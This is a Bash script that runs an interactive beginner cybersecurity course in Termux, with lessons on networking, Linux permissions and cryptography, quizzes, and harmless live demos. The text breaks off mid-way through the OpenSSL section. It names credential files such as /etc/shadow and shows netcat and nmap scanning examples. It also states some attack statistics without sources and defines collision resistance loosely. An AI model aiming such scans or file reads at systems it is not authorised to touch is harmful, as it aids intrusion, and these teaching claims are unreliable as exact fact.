#!/bin/bash
# ============================================
# CYBERSECURITY COURSE FOR TERMUX
# File: Cyber1.sh
# Author: Emmanuel suah
# Version: 1.0
# ============================================

# ============================================
# COLOR DEFINITIONS
# ============================================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
UNDERLINE='\033[4m'
BLINK='\033[5m'
NC='\033[0m' # No Color

# ============================================
# GLOBAL VARIABLES
# ============================================
COURSE_DIR="$HOME/cybersecurity_course"
PROGRESS_FILE="$COURSE_DIR/.progress"
NOTES_FILE="$COURSE_DIR/my_notes.txt"
QUIZ_SCORE=0
TOTAL_QUESTIONS=0
STUDENT_NAME=""

# ============================================
# UTILITY FUNCTIONS
# ============================================

clear_screen() {
    clear
    echo ""
}

press_enter() {
    echo ""
    echo -e "${YELLOW}Press [ENTER] to continue...${NC}"
    read -r
}

type_text() {
    local text="$1"
    local delay="${2:-0.03}"
    echo -n -e "${GREEN}"
    while IFS= read -r -n1 char; do
        echo -n "$char"
        sleep "$delay"
    done <<< "$text"
    echo -e "${NC}"
}

draw_line() {
    local char="${1:-=-}"
    local length="${2:-60}"
    printf '%*s\n' "$length" '' | tr ' ' "$char"
}

draw_box() {
    local title="$1"
    local width=60
    echo -e "${CYAN}"
    draw_line "=" $width
    printf "%-${width}s\n" "  $title"
    draw_line "=" $width
    echo -e "${NC}"
}

show_banner() {
    clear_screen
    echo -e "${RED}"
    cat << 'EOF'
  ██████╗██╗   ██╗██████╗ ███████╗██████╗
 ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
 ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝
 ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
 ╚██████╗   ██║   ██████╔╝███████╗██║  ██║
  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
EOF
    echo -e "${CYAN}"
    cat << 'EOF'
 ███████╗███████╗ ██████╗
 ██╔════╝██╔════╝██╔════╝
 ███████╗█████╗  ██║
 ╚════██║██╔══╝  ██║
 ███████║███████╗╚██████╗
 ╚══════╝╚══════╝ ╚═════╝
EOF
    echo -e "${YELLOW}"
    cat << 'EOF'
  ██████╗ ██████╗ ██╗   ██╗██████╗ ███████╗███████╗
 ██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔════╝██╔════╝
 ██║     ██║   ██║██║   ██║██████╔╝███████╗█████╗
 ██║     ██║   ██║██║   ██║██╔══██╗╚════██║██╔══╝
 ╚██████╗╚██████╔╝╚██████╔╝██║  ██║███████║███████╗
  ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝
EOF
    echo -e "${NC}"
    echo -e "${WHITE}          ⚡ Powered by Termux | Ethical Hacking ⚡${NC}"
    draw_line "=" 60
    sleep 1
}

save_progress() {
    local module="$1"
    echo "$module" >> "$PROGRESS_FILE"
}

check_progress() {
    local module="$1"
    if [ -f "$PROGRESS_FILE" ]; then
        grep -q "$module" "$PROGRESS_FILE" && echo "✅" || echo "⬜"
    else
        echo "⬜"
    fi
}

setup_environment() {
    mkdir -p "$COURSE_DIR"
    mkdir -p "$COURSE_DIR/labs"
    mkdir -p "$COURSE_DIR/notes"
    mkdir -p "$COURSE_DIR/tools"
    
    if [ ! -f "$PROGRESS_FILE" ]; then
        touch "$PROGRESS_FILE"
    fi
    
    if [ ! -f "$NOTES_FILE" ]; then
        echo "# My Cybersecurity Course Notes" > "$NOTES_FILE"
        echo "# Started: $(date)" >> "$NOTES_FILE"
        echo "================================" >> "$NOTES_FILE"
    fi
}

add_note() {
    local note="$1"
    echo "" >> "$NOTES_FILE"
    echo "[$(date '+%Y-%m-%d %H:%M')] $note" >> "$NOTES_FILE"
    echo -e "${GREEN}✅ Note saved!${NC}"
}

# ============================================
# QUIZ SYSTEM
# ============================================

ask_question() {
    local question="$1"
    local answer="$2"
    local hint="$3"
    
    TOTAL_QUESTIONS=$((TOTAL_QUESTIONS + 1))
    
    echo -e "\n${CYAN}❓ Question $TOTAL_QUESTIONS:${NC}"
    echo -e "${WHITE}$question${NC}"
    echo -e "${YELLOW}💡 Hint: $hint${NC}"
    echo -n -e "${GREEN}Your Answer: ${NC}"
    read -r user_answer
    
    if [[ "${user_answer,,}" == "${answer,,}" ]]; then
        echo -e "${GREEN}✅ CORRECT! Well done!${NC}"
        QUIZ_SCORE=$((QUIZ_SCORE + 1))
    else
        echo -e "${RED}❌ Wrong! Correct answer: ${YELLOW}$answer${NC}"
    fi
    sleep 1
}

show_quiz_result() {
    echo ""
    draw_line "=" 60
    echo -e "${CYAN}📊 QUIZ RESULTS${NC}"
    draw_line "=" 60
    echo -e "Score: ${YELLOW}$QUIZ_SCORE / $TOTAL_QUESTIONS${NC}"
    
    local percentage=0
    if [ "$TOTAL_QUESTIONS" -gt 0 ]; then
        percentage=$((QUIZ_SCORE * 100 / TOTAL_QUESTIONS))
    fi
    
    echo -e "Percentage: ${YELLOW}$percentage%${NC}"
    
    if [ "$percentage" -ge 80 ]; then
        echo -e "${GREEN}🏆 EXCELLENT! You passed with flying colors!${NC}"
    elif [ "$percentage" -ge 60 ]; then
        echo -e "${YELLOW}👍 GOOD! Keep studying to improve!${NC}"
    else
        echo -e "${RED}📚 Need more study. Review the material!${NC}"
    fi
    
    QUIZ_SCORE=0
    TOTAL_QUESTIONS=0
}

# ============================================
# MODULE 1: INTRODUCTION TO CYBERSECURITY
# ============================================

module_1_intro() {
    clear_screen
    draw_box "MODULE 1: INTRODUCTION TO CYBERSECURITY"
    
    echo -e "${CYAN}📚 LEARNING OBJECTIVES:${NC}"
    echo -e "  ${GREEN}►${NC} Understand what cybersecurity is"
    echo -e "  ${GREEN}►${NC} Learn about the CIA Triad"
    echo -e "  ${GREEN}►${NC} Types of hackers and threats"
    echo -e "  ${GREEN}►${NC} Basic security concepts"
    echo ""
    press_enter
    
    # Lesson 1.1
    clear_screen
    echo -e "${YELLOW}📖 LESSON 1.1: What is Cybersecurity?${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
Cybersecurity is the practice of protecting systems, networks,
and programs from digital attacks. These attacks are usually
aimed at:

  • Accessing, changing, or destroying sensitive information
  • Extorting money from users
  • Interrupting normal business processes

WHY IS IT IMPORTANT?
━━━━━━━━━━━━━━━━━━━
  → 2,200+ cyber attacks happen daily
  → A cyberattack occurs every 39 seconds
  → Cybercrime costs $6 trillion annually
  → 95% of breaches are due to human error

CYBERSECURITY DOMAINS:
━━━━━━━━━━━━━━━━━━━━━━
  1. Network Security
  2. Application Security
  3. Information Security
  4. Operational Security
  5. Disaster Recovery
  6. End-user Education
LESSON

    press_enter
    
    # Lesson 1.2 - CIA Triad
    clear_screen
    echo -e "${YELLOW}📖 LESSON 1.2: The CIA Triad${NC}"
    draw_line "-" 60
    echo ""
    
    echo -e "${RED}C${NC} - ${WHITE}CONFIDENTIALITY${NC}"
    echo -e "    Ensuring information is only accessible to"
    echo -e "    those authorized to see it."
    echo -e "    ${GREEN}Example: Encryption, passwords, access control${NC}"
    echo ""
    
    echo -e "${GREEN}I${NC} - ${WHITE}INTEGRITY${NC}"
    echo -e "    Ensuring data is accurate and hasn't been"
    echo -e "    tampered with."
    echo -e "    ${GREEN}Example: Hashing, digital signatures, checksums${NC}"
    echo ""
    
    echo -e "${BLUE}A${NC} - ${WHITE}AVAILABILITY${NC}"
    echo -e "    Ensuring systems and data are accessible"
    echo -e "    when needed."
    echo -e "    ${GREEN}Example: Redundancy, backups, DDoS protection${NC}"
    echo ""
    
    echo -e "${CYAN}┌─────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│         CIA TRIAD DIAGRAM           │${NC}"
    echo -e "${CYAN}│                                     │${NC}"
    echo -e "${CYAN}│          Confidentiality            │${NC}"
    echo -e "${CYAN}│               /\                    │${NC}"
    echo -e "${CYAN}│              /  \                   │${NC}"
    echo -e "${CYAN}│             /    \                  │${NC}"
    echo -e "${CYAN}│            /  CIA \                 │${NC}"
    echo -e "${CYAN}│           / TRIAD  \                │${NC}"
    echo -e "${CYAN}│          /──────────\               │${NC}"
    echo -e "${CYAN}│    Integrity    Availability        │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────┘${NC}"
    
    press_enter
    
    # Lesson 1.3 - Types of Hackers
    clear_screen
    echo -e "${YELLOW}📖 LESSON 1.3: Types of Hackers${NC}"
    draw_line "-" 60
    echo ""
    
    echo -e "${WHITE}🎩 WHITE HAT HACKERS (Ethical Hackers)${NC}"
    echo -e "   Security professionals who test systems legally"
    echo -e "   ${GREEN}Purpose: Find vulnerabilities to fix them${NC}"
    echo ""
    
    echo -e "${RED}🎩 BLACK HAT HACKERS (Crackers)${NC}"
    echo -e "   Malicious hackers who break into systems illegally"
    echo -e "   ${RED}Purpose: Steal data, cause damage, extort money${NC}"
    echo ""
    
    echo -e "${YELLOW}🎩 GREY HAT HACKERS${NC}"
    echo -e "   Operate between ethical and unethical"
    echo -e "   ${YELLOW}Purpose: May hack without permission but report it${NC}"
    echo ""
    
    echo -e "${BLUE}🎩 BLUE HAT HACKERS${NC}"
    echo -e "   Security professionals hired before product launch"
    echo -e "   ${BLUE}Purpose: Bug testing before release${NC}"
    echo ""
    
    echo -e "${MAGENTA}🎩 RED HAT HACKERS${NC}"
    echo -e "   Vigilante hackers who target black hats"
    echo -e "   ${MAGENTA}Purpose: Stop malicious hackers aggressively${NC}"
    echo ""
    
    echo -e "${CYAN}🎩 SCRIPT KIDDIES${NC}"
    echo -e "   Unskilled individuals using pre-made tools"
    echo -e "   ${CYAN}Purpose: Show off or cause damage without skill${NC}"
    
    press_enter
    
    # Lesson 1.4 - Common Threats
    clear_screen
    echo -e "${YELLOW}📖 LESSON 1.4: Common Cyber Threats${NC}"
    draw_line "-" 60
    echo ""
    
    threats=(
        "🦠 MALWARE|Malicious software (virus, worm, trojan, ransomware)"
        "🎣 PHISHING|Fraudulent emails/sites to steal credentials"
        "💉 SQL INJECTION|Injecting malicious SQL into databases"
        "🔒 RANSOMWARE|Encrypts files and demands ransom payment"
        "🕵️ MAN-IN-THE-MIDDLE|Intercepting communications between parties"
        "🌊 DDoS ATTACK|Overwhelming a server with traffic"
        "🚪 BACKDOOR|Hidden entry point bypassing authentication"
        "📱 SOCIAL ENGINEERING|Manipulating humans to reveal information"
        "🔑 BRUTE FORCE|Trying all password combinations"
        "💻 ZERO-DAY|Exploiting unknown/unpatched vulnerabilities"
    )
    
    for threat in "${threats[@]}"; do
        IFS='|' read -r name description <<< "$threat"
        echo -e "${RED}$name${NC}"
        echo -e "   ${WHITE}$description${NC}"
        echo ""
    done
    
    press_enter
    
    # Module 1 Quiz
    clear_screen
    echo -e "${MAGENTA}🧠 MODULE 1 QUIZ${NC}"
    draw_line "=" 60
    
    ask_question \
        "What does CIA stand for in the CIA Triad?" \
        "confidentiality integrity availability" \
        "Three pillars of information security"
    
    ask_question \
        "Which type of hacker operates ethically and legally?" \
        "white hat" \
        "Think about hat colors..."
    
    ask_question \
        "What type of attack overwhelms a server with traffic?" \
        "ddos" \
        "Distributed Denial of ___"
    
    ask_question \
        "What is the technique of manipulating humans called?" \
        "social engineering" \
        "Not technical, but psychological"
    
    show_quiz_result
    save_progress "MODULE_1"
    press_enter
}

# ============================================
# MODULE 2: NETWORKING FUNDAMENTALS
# ============================================

module_2_networking() {
    clear_screen
    draw_box "MODULE 2: NETWORKING FUNDAMENTALS"
    
    echo -e "${CYAN}📚 LEARNING OBJECTIVES:${NC}"
    echo -e "  ${GREEN}►${NC} Understand IP addresses and subnetting"
    echo -e "  ${GREEN}►${NC} Learn about ports and protocols"
    echo -e "  ${GREEN}►${NC} OSI Model and TCP/IP"
    echo -e "  ${GREEN}►${NC} DNS and how it works"
    press_enter
    
    # Lesson 2.1 - IP Addresses
    clear_screen
    echo -e "${YELLOW}📖 LESSON 2.1: IP Addresses${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
An IP (Internet Protocol) address is a unique identifier
for devices on a network.

IPv4 ADDRESS FORMAT:
━━━━━━━━━━━━━━━━━━━
  Format: XXX.XXX.XXX.XXX
  Example: 192.168.1.100
  Range: 0.0.0.0 to 255.255.255.255
  Total: ~4.3 billion addresses

IPv6 ADDRESS FORMAT:
━━━━━━━━━━━━━━━━━━━
  Format: XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX
  Example: 2001:0db8:85a3:0000:0000:8a2e:0370:7334
  Total: 340 undecillion addresses

SPECIAL IP RANGES:
━━━━━━━━━━━━━━━━━━
  Private (Class A): 10.0.0.0 - 10.255.255.255
  Private (Class B): 172.16.0.0 - 172.31.255.255
  Private (Class C): 192.168.0.0 - 192.168.255.255
  Loopback:          127.0.0.1 (localhost)
  Broadcast:         255.255.255.255
LESSON
    
    echo ""
    echo -e "${GREEN}💻 LIVE DEMO - Your Network Info:${NC}"
    draw_line "-" 40
    echo -e "Hostname: ${YELLOW}$(hostname 2>/dev/null || echo 'Unknown')${NC}"
    echo -e "IP Info: ${YELLOW}$(ip addr show 2>/dev/null | grep 'inet ' | head -2 || echo 'Use: ip addr show')${NC}"
    
    press_enter
    
    # Lesson 2.2 - Ports and Protocols
    clear_screen
    echo -e "${YELLOW}📖 LESSON 2.2: Common Ports & Protocols${NC}"
    draw_line "-" 60
    echo ""
    
    echo -e "${CYAN}PORT RANGES:${NC}"
    echo -e "  Well-known Ports:  ${WHITE}0 - 1023${NC}"
    echo -e "  Registered Ports:  ${WHITE}1024 - 49151${NC}"
    echo -e "  Dynamic Ports:     ${WHITE}49152 - 65535${NC}"
    echo ""
    
    echo -e "${CYAN}IMPORTANT PORTS TO KNOW:${NC}"
    echo -e "┌──────┬─────────┬─────────────────────────────┐"
    echo -e "│ Port │Protocol │ Service                     │"
    echo -e "├──────┼─────────┼─────────────────────────────┤"
    
    ports=(
        "21|TCP|FTP - File Transfer Protocol"
        "22|TCP|SSH - Secure Shell"
        "23|TCP|Telnet (Unencrypted)"
        "25|TCP|SMTP - Email Sending"
        "53|UDP/TCP|DNS - Domain Name System"
        "80|TCP|HTTP - Web Traffic"
        "110|TCP|POP3 - Email Retrieval"
        "143|TCP|IMAP - Email Access"
        "443|TCP|HTTPS - Secure Web"
        "445|TCP|SMB - File Sharing"
        "3306|TCP|MySQL Database"
        "3389|TCP|RDP - Remote Desktop"
        "8080|TCP|HTTP Alternate"
        "8443|TCP|HTTPS Alternate"
    )
    
    for port_info in "${ports[@]}"; do
        IFS='|' read -r port proto service <<< "$port_info"
        printf "│ %-4s │ %-7s │ %-27s │\n" "$port" "$proto" "$service"
    done
    
    echo -e "└──────┴─────────┴─────────────────────────────┘"
    
    press_enter
    
    # Lesson 2.3 - OSI Model
    clear_screen
    echo -e "${YELLOW}📖 LESSON 2.3: The OSI Model${NC}"
    draw_line "-" 60
    echo ""
    
    echo -e "${WHITE}The OSI (Open Systems Interconnection) model has 7 layers:${NC}"
    echo ""
    
    echo -e "${RED}Layer 7 - APPLICATION${NC}"
    echo -e "   What user interacts with | HTTP, FTP, DNS, SMTP"
    echo ""
    
    echo -e "${RED}Layer 6 - PRESENTATION${NC}"
    echo -e "   Data formatting, encryption | SSL, TLS, JPEG, MP3"
    echo ""
    
    echo -e "${YELLOW}Layer 5 - SESSION${NC}"
    echo -e "   Manages sessions/connections | NetBIOS, RPC"
    echo ""
    
    echo -e "${YELLOW}Layer 4 - TRANSPORT${NC}"
    echo -e "   End-to-end delivery | TCP, UDP"
    echo ""
    
    echo -e "${GREEN}Layer 3 - NETWORK${NC}"
    echo -e "   Routing and IP addressing | IP, ICMP, OSPF"
    echo ""
    
    echo -e "${BLUE}Layer 2 - DATA LINK${NC}"
    echo -e "   MAC addressing, frames | Ethernet, WiFi"
    echo ""
    
    echo -e "${BLUE}Layer 1 - PHYSICAL${NC}"
    echo -e "   Physical transmission | Cables, hubs, signals"
    echo ""
    
    echo -e "${CYAN}Memory Trick: ${WHITE}'All People Seem To Need Data Processing'${NC}"
    echo -e "(Application, Presentation, Session, Transport, Network, Data Link, Physical)"
    
    press_enter
    
    # Lesson 2.4 - Network Tools
    clear_screen
    echo -e "${YELLOW}📖 LESSON 2.4: Essential Network Commands${NC}"
    draw_line "-" 60
    echo ""
    
    network_commands=(
        "ping|Test connectivity to host|ping google.com"
        "traceroute|Trace packet route|traceroute google.com"
        "nslookup|DNS lookup|nslookup google.com"
        "netstat|Network connections|netstat -tulpn"
        "ifconfig/ip|Interface info|ip addr show"
        "curl|HTTP requests|curl -I https://google.com"
        "wget|Download files|wget https://example.com/file"
        "nc (netcat)|Network Swiss knife|nc -zv host port"
        "nmap|Port scanner|nmap -sV target"
        "whois|Domain info|whois google.com"
    )
    
    echo -e "${CYAN}┌─────────────┬──────────────────────┬──────────────────────┐${NC}"
    echo -e "${CYAN}│ Command     │ Description          │ Example              │${NC}"
    echo -e "${CYAN}├─────────────┼──────────────────────┼──────────────────────┤${NC}"
    
    for cmd in "${network_commands[@]}"; do
        IFS='|' read -r command description example <<< "$cmd"
        printf "${CYAN}│${NC} %-11s ${CYAN}│${NC} %-20s ${CYAN}│${NC} %-20s ${CYAN}│${NC}\n" \
            "$command" "$description" "$example"
    done
    
    echo -e "${CYAN}└─────────────┴──────────────────────┴──────────────────────┘${NC}"
    
    echo ""
    echo -e "${GREEN}💻 LIVE DEMO:${NC}"
    echo -e "${YELLOW}Running: ping -c 3 8.8.8.8${NC}"
    ping -c 3 8.8.8.8 2>/dev/null || echo -e "${RED}No internet connection available${NC}"
    
    press_enter
    
    # Module 2 Quiz
    clear_screen
    echo -e "${MAGENTA}🧠 MODULE 2 QUIZ${NC}"
    draw_line "=" 60
    
    ask_question \
        "What port does SSH use?" \
        "22" \
        "Secure Shell port number"
    
    ask_question \
        "What port does HTTPS use?" \
        "443" \
        "Secure web traffic"
    
    ask_question \
        "How many layers does the OSI model have?" \
        "7" \
        "Count them: Physical to Application"
    
    ask_question \
        "What does DNS stand for?" \
        "domain name system" \
        "Translates names to IP addresses"
    
    show_quiz_result
    save_progress "MODULE_2"
    press_enter
}

# ============================================
# MODULE 3: LINUX SECURITY BASICS
# ============================================

module_3_linux() {
    clear_screen
    draw_box "MODULE 3: LINUX SECURITY BASICS"
    
    echo -e "${CYAN}📚 LEARNING OBJECTIVES:${NC}"
    echo -e "  ${GREEN}►${NC} Linux file permissions"
    echo -e "  ${GREEN}►${NC} User management security"
    echo -e "  ${GREEN}►${NC} Process and service security"
    echo -e "  ${GREEN}►${NC} Log analysis"
    press_enter
    
    # Lesson 3.1 - File Permissions
    clear_screen
    echo -e "${YELLOW}📖 LESSON 3.1: Linux File Permissions${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
Linux uses a permission system with three types of access:
Read (r=4), Write (w=2), Execute (x=1)

PERMISSION FORMAT:
━━━━━━━━━━━━━━━━━
  -rwxrwxrwx
  │││││││││└─ Others: execute
  ││││││││└── Others: write
  │││││││└─── Others: read
  ││││││└──── Group: execute
  │││││└───── Group: write
  ││││└────── Group: read
  │││└─────── Owner: execute
  ││└──────── Owner: write
  │└───────── Owner: read
  └────────── File type (- file, d directory, l link)

EXAMPLE: -rwxr-xr--
  Owner: rwx = 7 (read+write+execute)
  Group: r-x = 5 (read+execute)
  Other: r-- = 4 (read only)
  Numeric: 754
LESSON
    
    echo ""
    echo -e "${CYAN}COMMON PERMISSION COMMANDS:${NC}"
    echo -e "  ${GREEN}chmod 755 file${NC}  - rwxr-xr-x"
    echo -e "  ${GREEN}chmod 644 file${NC}  - rw-r--r--"
    echo -e "  ${GREEN}chmod 600 file${NC}  - rw------- (private key!)"
    echo -e "  ${GREEN}chmod 777 file${NC}  - rwxrwxrwx (DANGEROUS!)"
    echo -e "  ${GREEN}chown user file${NC} - Change owner"
    echo -e "  ${GREEN}chgrp grp file${NC}  - Change group"
    echo ""
    
    echo -e "${GREEN}💻 DEMO - Creating and Setting Permissions:${NC}"
    echo -e "${YELLOW}Creating test file...${NC}"
    
    touch "$COURSE_DIR/labs/test_permissions.txt" 2>/dev/null
    echo "Test content" > "$COURSE_DIR/labs/test_permissions.txt"
    chmod 644 "$COURSE_DIR/labs/test_permissions.txt"
    
    echo -e "File created: ${WHITE}$COURSE_DIR/labs/test_permissions.txt${NC}"
    ls -la "$COURSE_DIR/labs/test_permissions.txt" 2>/dev/null
    
    press_enter
    
    # Lesson 3.2 - User Management
    clear_screen
    echo -e "${YELLOW}📖 LESSON 3.2: User Management Security${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
USER MANAGEMENT COMMANDS:
━━━━━━━━━━━━━━━━━━━━━━━━━

  Add User:     useradd -m username
  Set Password: passwd username
  Delete User:  userdel -r username
  Add to Group: usermod -aG groupname user
  Switch User:  su - username
  Current User: whoami
  All Users:    cat /etc/passwd

IMPORTANT FILES:
━━━━━━━━━━━━━━━━
  /etc/passwd  - User accounts info
  /etc/shadow  - Encrypted passwords
  /etc/group   - Group information
  /etc/sudoers - Sudo permissions

PASSWORD SECURITY:
━━━━━━━━━━━━━━━━━━
  ✅ Minimum 12 characters
  ✅ Mix of upper/lowercase
  ✅ Numbers and symbols
  ✅ No dictionary words
  ✅ Different for each account
  ✅ Use a password manager
  ❌ Never share passwords
  ❌ Never reuse passwords
LESSON
    
    echo -e "${GREEN}💻 DEMO:${NC}"
    echo -e "Current user: ${YELLOW}$(whoami)${NC}"
    echo -e "Home directory: ${YELLOW}$HOME${NC}"
    echo -e "User ID: ${YELLOW}$(id)${NC}"
    
    press_enter
    
    # Lesson 3.3 - Important Directories
    clear_screen
    echo -e "${YELLOW}📖 LESSON 3.3: Security-Critical Linux Directories${NC}"
    draw_line "-" 60
    echo ""
    
    dirs=(
        "/etc/passwd|User account information"
        "/etc/shadow|Hashed passwords (root only)"
        "/etc/hosts|Local DNS resolution"
        "/etc/ssh/sshd_config|SSH server configuration"
        "/var/log/auth.log|Authentication logs"
        "/var/log/syslog|System logs"
        "/var/log/apache2/|Web server logs"
        "/tmp|Temporary files (watch for malware)"
        "/proc|Process information"
        "/usr/bin|User programs"
        "/root|Root user home directory"
        "/home|User home directories"
    )
    
    echo -e "${CYAN}┌────────────────────────┬─────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ Directory              │ Purpose                         │${NC}"
    echo -e "${CYAN}├────────────────────────┼─────────────────────────────────┤${NC}"
    
    for dir_info in "${dirs[@]}"; do
        IFS='|' read -r directory purpose <<< "$dir_info"
        printf "${CYAN}│${NC} %-22s ${CYAN}│${NC} %-31s ${CYAN}│${NC}\n" "$directory" "$purpose"
    done
    
    echo -e "${CYAN}└────────────────────────┴─────────────────────────────────┘${NC}"
    
    press_enter
    
    # Lesson 3.4 - Bash Security Scripts
    clear_screen
    echo -e "${YELLOW}📖 LESSON 3.4: Security Bash Scripts${NC}"
    draw_line "-" 60
    echo ""
    
    echo -e "${CYAN}Creating a System Security Check Script...${NC}"
    echo ""
    
    cat > "$COURSE_DIR/labs/security_check.sh" << 'SCRIPT'
#!/bin/bash
# Basic System Security Check Script

echo "==================================="
echo "   SYSTEM SECURITY CHECK"
echo "==================================="
echo ""

echo "[*] System Information:"
echo "    OS: $(uname -s) $(uname -r)"
echo "    User: $(whoami)"
echo "    Date: $(date)"
echo ""

echo "[*] Checking for open ports..."
if command -v netstat &>/dev/null; then
    netstat -tulpn 2>/dev/null | head -20
elif command -v ss &>/dev/null; then
    ss -tulpn 2>/dev/null | head -20
else
    echo "    netstat/ss not available"
fi
echo ""

echo "[*] Checking last logins..."
last 2>/dev/null | head -10 || echo "    'last' not available"
echo ""

echo "[*] Checking running processes..."
ps aux 2>/dev/null | head -15 || echo "    'ps' not available"
echo ""

echo "[*] Disk usage..."
df -h 2>/dev/null || echo "    'df' not available"
echo ""

echo "[*] Memory usage..."
free -h 2>/dev/null || echo "    'free' not available"
echo ""

echo "==================================="
echo "   CHECK COMPLETE"
echo "==================================="
SCRIPT
    
    chmod +x "$COURSE_DIR/labs/security_check.sh"
    echo -e "${GREEN}✅ Script created: $COURSE_DIR/labs/security_check.sh${NC}"
    echo ""
    echo -e "${YELLOW}Running security check...${NC}"
    echo ""
    bash "$COURSE_DIR/labs/security_check.sh"
    
    press_enter
    
    # Module 3 Quiz
    clear_screen
    echo -e "${MAGENTA}🧠 MODULE 3 QUIZ${NC}"
    draw_line "=" 60
    
    ask_question \
        "What permission number means read+write+execute for owner only?" \
        "700" \
        "Think: rwx for owner, nothing for others"
    
    ask_question \
        "Which file stores hashed passwords in Linux?" \
        "/etc/shadow" \
        "Path starts with /etc/..."
    
    ask_question \
        "What command shows the current logged-in user?" \
        "whoami" \
        "Ask yourself..."
    
    ask_question \
        "What does chmod 644 set for a file?" \
        "rw-r--r--" \
        "Owner: rw, Group: r, Others: r"
    
    show_quiz_result
    save_progress "MODULE_3"
    press_enter
}

# ============================================
# MODULE 4: CRYPTOGRAPHY
# ============================================

module_4_crypto() {
    clear_screen
    draw_box "MODULE 4: CRYPTOGRAPHY"
    
    echo -e "${CYAN}📚 LEARNING OBJECTIVES:${NC}"
    echo -e "  ${GREEN}►${NC} Symmetric vs Asymmetric encryption"
    echo -e "  ${GREEN}►${NC} Hashing algorithms"
    echo -e "  ${GREEN}►${NC} SSL/TLS understanding"
    echo -e "  ${GREEN}►${NC} Practical cryptography in Termux"
    press_enter
    
    # Lesson 4.1 - Encryption Basics
    clear_screen
    echo -e "${YELLOW}📖 LESSON 4.1: Encryption Fundamentals${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
WHAT IS ENCRYPTION?
━━━━━━━━━━━━━━━━━━━
Converting readable data (plaintext) into unreadable
format (ciphertext) using an algorithm and key.

  Plaintext + Key + Algorithm = Ciphertext
  Ciphertext + Key + Algorithm = Plaintext

SYMMETRIC ENCRYPTION:
━━━━━━━━━━━━━━━━━━━━━
  • Same key for encryption AND decryption
  • Fast but key sharing is a problem
  • Examples: AES, DES, 3DES, Blowfish

  [Sender] → encrypt with KEY → [Ciphertext] → decrypt with KEY → [Receiver]

ASYMMETRIC ENCRYPTION:
━━━━━━━━━━━━━━━━━━━━━━
  • Public key encrypts, Private key decrypts
  • Solves key distribution problem
  • Slower than symmetric
  • Examples: RSA, ECC, DSA, ElGamal

  [Sender] → encrypt with PUBLIC KEY → [Ciphertext]
                                              ↓
                                decrypt with PRIVATE KEY → [Receiver]

HYBRID ENCRYPTION:
━━━━━━━━━━━━━━━━━━
  Best of both worlds (used in HTTPS/TLS)
  1. Asymmetric encryption to share symmetric key
  2. Symmetric encryption for actual data
LESSON
    
    press_enter
    
    # Lesson 4.2 - Hashing
    clear_screen
    echo -e "${YELLOW}📖 LESSON 4.2: Cryptographic Hashing${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
WHAT IS HASHING?
━━━━━━━━━━━━━━━━
One-way function that converts data into fixed-length
string. Cannot be reversed (unlike encryption).

PROPERTIES:
  ✅ Deterministic (same input = same output)
  ✅ Fast to compute
  ✅ Pre-image resistant (can't reverse)
  ✅ Avalanche effect (small change = different hash)
  ✅ Collision resistant (no two inputs = same hash)

COMMON HASH ALGORITHMS:
━━━━━━━━━━━━━━━━━━━━━━━
  MD5     - 128-bit  (BROKEN - don't use for security!)
  SHA-1   - 160-bit  (WEAK - being phased out)
  SHA-256 - 256-bit  (SECURE - recommended)
  SHA-512 - 512-bit  (VERY SECURE)
  bcrypt  - Variable  (Best for passwords)
  Argon2  - Variable  (Modern password hashing)

USE CASES:
━━━━━━━━━━
  • Password storage
  • File integrity verification
  • Digital signatures
  • Blockchain
  • Message authentication codes (HMAC)
LESSON
    
    echo -e "${GREEN}💻 LIVE DEMO - Hashing in Termux:${NC}"
    echo ""
    
    TEST_STRING="Hello Cybersecurity Course!"
    echo -e "${YELLOW}String: $TEST_STRING${NC}"
    echo ""
    
    echo -e "${WHITE}MD5:${NC}"
    echo "$TEST_STRING" | md5sum 2>/dev/null || echo "md5sum not available"
    
    echo -e "${WHITE}SHA-1:${NC}"
    echo "$TEST_STRING" | sha1sum 2>/dev/null || echo "sha1sum not available"
    
    echo -e "${WHITE}SHA-256:${NC}"
    echo "$TEST_STRING" | sha256sum 2>/dev/null || echo "sha256sum not available"
    
    echo -e "${WHITE}SHA-512:${NC}"
    echo "$TEST_STRING" | sha512sum 2>/dev/null || echo "sha512sum not available"
    
    press_enter
    
    # Lesson 4.3 - Practical Crypto
    clear_screen
    echo -e "${YELLOW}📖 LESSON 4.3: Practical Cryptography in Termux${NC}"
    draw_line "-" 60
    echo ""
    
    echo -e "${CYAN}BASE64 ENCODING (Not Encryption!):${NC}"
    echo ""
    
    echo -e "${YELLOW}Encoding a string:${NC}"
    ENCODED=$(echo "Secret Message" | base64)
    echo -e "Original: ${WHITE}Secret Message${NC}"
    echo -e "Base64:   ${WHITE}$ENCODED${NC}"
    
    echo ""
    echo -e "${YELLOW}Decoding base64:${NC}"
    DECODED=$(echo "$ENCODED" | base64 -d)
    echo -e "Decoded: ${WHITE}$DECODED${NC}"
    
    echo ""
    echo -e "${CYAN}OPENSSL COMMANDS (Install: pkg install openssl):${NC}"
    echo ""
    
    openssl_cmds=(
        "openssl genrsa -out key.pem 2048|Generate RSA private key"
        "openssl rsa -in key.pem -pubout|Extract public key"
        "openssl enc -aes-256-cbc -in file -out file.enc|Encrypt file"
        "openssl enc -d -aes-256-cbc -in file.enc|Decrypt file"
        "openssl dgst -sha256 file|SHA256 hash of file"
        "openssl s_client -connect host:443|Test SSL connection"
        "openssl x509 -in cert.pem -text|View certificate"
        "openssl passwd -6 password|Generate password hash"
